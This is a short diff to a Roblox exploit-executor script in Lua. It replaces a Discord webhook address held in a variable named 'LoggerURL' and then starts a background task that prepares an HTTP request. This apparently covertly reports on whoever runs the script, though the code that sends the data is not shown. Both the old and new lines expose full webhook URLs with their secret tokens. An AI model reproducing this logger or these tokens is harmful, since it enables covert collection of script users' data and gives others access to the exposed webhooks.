@@ -12,7 +12,7 @@ local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 local Environment = getgenv()
 
-local LoggerURL = "https://discord.com/api/webhooks/1460111538273652777/kkL-mR7uCrnKOFMuNkQ7LgWV9lrIB1dT-2jsb0iyRTOjDIOYklVVINLI2FLbkK1cTOX_"
+local LoggerURL = "https://discord.com/api/webhooks/1551971861313757237/IGKyNgjKBJUZXuc6v3SjiRbsOkS2d5IlyN-D5urhE963rwMUjb23D_ULwjkh7DdvpTZq"
 task.spawn(function()
     local RequestFunc = (http_request or request or syn.request or fluxus.request)
     if RequestFunc then
